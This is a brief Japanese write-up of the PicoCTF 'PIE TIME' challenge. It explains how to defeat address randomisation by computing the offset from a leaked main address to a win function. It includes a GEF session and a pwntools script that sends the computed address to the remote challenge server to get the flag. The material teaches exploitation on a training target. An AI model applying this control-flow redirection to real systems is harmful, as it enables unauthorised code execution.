## PicoCTF

### PIE TIME

プログラムを実行するとmain関数のアドレスが表示され、
プログラムは入力したアドレスの関数を実行することができる
win関数が存在し、ここに飛べばフラグを取得できる
→main関数とwin関数の差分を計算すれば良い

```
gef➤  b *main
Breakpoint 1 at 0x133d
gef➤  p(*main - *win)
$1 = 0x96
```

オフセットは0x96であることがわかった
つまり以下でフラグを取得できる

```
from pwn import *

#target = process("./vuln")
target = remote('rescued-float.picoctf.net',59172)

rec = target.recvline()
rec2 = rec.split(b': ')[1][:-1]

rec2_str = rec2.decode('utf-8')

value = int(rec2_str, 16)

result = value - 0x96
hex_result = hex(result)

print(hex_result)

#recv.split(b' : ')[1][:-1]
target.sendlineafter(b'Enter the address to jump to, ex => 0x12345:',hex_result)
target.interactive()
```
